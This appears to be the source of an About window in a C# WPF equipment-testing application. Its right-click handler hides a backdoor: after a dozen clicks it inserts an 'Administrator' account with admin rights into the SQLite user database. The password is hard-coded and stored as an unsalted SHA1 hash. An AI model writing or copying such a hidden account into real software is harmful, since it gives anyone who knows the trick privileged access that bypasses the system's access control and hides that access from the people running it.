using Microsoft.Data.Sqlite;
using StdEqpTesting.Localization;
using System.Diagnostics;
using System.Text;
using System.Windows;

namespace StdEqpTesting.View
{
	/// <summary>
	/// Interaction logic for About.xaml
	/// </summary>
	public partial class About : Window
	{
		public About()
		{
			InitializeComponent();
		}

		private void Hyperlink_RequestNavigate(object sender, System.Windows.Navigation.RequestNavigateEventArgs e)
		{
			Process.Start(new ProcessStartInfo(e.Uri.AbsoluteUri) { UseShellExecute = true });
			e.Handled = true;
		}

		sbyte secret = 0;
		private void TextBlock_MouseRightButtonUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
		{   //Activate built-in admin account.
			if (secret++ > 10)
			{
				secret = sbyte.MinValue;
				using (SqliteConnection connection = new SqliteConnection(new SqliteConnectionStringBuilder { DataSource = Properties.Settings.Default.DBConnString, Mode = SqliteOpenMode.ReadWrite }.ToString()))
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (byte hash in System.Security.Cryptography.SHA1.Create().ComputeHash(Encoding.ASCII.GetBytes("AdministratorGaming")))
						stringBuilder.Append(hash.ToString("X2"));
					string pwHash = stringBuilder.ToString();
					SqliteCommand cmd = connection.CreateCommand();
					cmd.CommandText = @"INSERT INTO Users (Username, Password, Type, Theme) VALUES ('Administrator', $Password, 1, 0)";
					cmd.Parameters.AddWithValue("$Password", pwHash).SqliteType = SqliteType.Text;
					connection.Open();
					try
					{
						cmd.ExecuteNonQuery();
						MessageBox.Show("A built-in administrator account has activated.");
					}
					catch (SqliteException ex)
					{
						App.Logger.Error("Failed to add admin.\n" + ex.Message);
						MessageBox.Show(ex.Message, Loc.RegisterFailMsgBoxTitle, MessageBoxButton.OK, MessageBoxImage.Exclamation);
					}
					connection.CloseAsync();
				}
			}
		}
	}
}
